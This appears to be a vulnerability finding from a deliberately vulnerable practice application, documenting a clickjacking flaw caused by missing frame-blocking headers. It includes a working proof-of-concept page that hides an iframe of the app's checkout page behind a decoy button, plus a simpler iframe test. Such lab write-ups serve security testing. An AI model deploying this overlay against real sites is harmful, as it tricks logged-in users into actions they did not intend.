# Clickjacking
This attack tricks users into clicking on a button, link, or other interactable on an attacker controlled/compromised website that performs an unintendded action on an authenticated and/or trusted site.

## Exploitation
**Location** _Entire Application_
Clickjacking is present since the X-Frame-Options / Content-Security-Policy: frame-ancestors directive are both not properly implemented on the application.  For exploitation a more intricately designed website can be made to simulate a realistic attacker website meant to scam users authenticated to vulnerablecandle, the attack can be tested through this example HTML text:

    # HTML
    <button style="z-index: 2; position: absolute; margin-left: 100px; margin-top: 30px;" class="button"> Remove Add</button>
    <div style="overflow: hidden; margin: 15px auto; max-width: 50px;">
        <iframe scrolling="no" src="http://localhost:4200/checkout" style="z-index: 1; position: absolute; border: 0px none; margin-left: -650px; height: 200px; margin-top: -100px; width: 200px;"></iframe>
    </div>

    # CSS
    .button {
    background-color: #4CAF50;
    border: none;
    color: white;
    padding: 32px 32px;
    text-align: center;
    text-decoration: none;
    display: block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;
    }

For the sake of simplcity the recommended way to test for Clickjacking is simply testing an iframe like below:

    <html>
        <body>
            <iframe src="http://localhost:4200/checkout"></iframe>
        </body>
    </html>
    
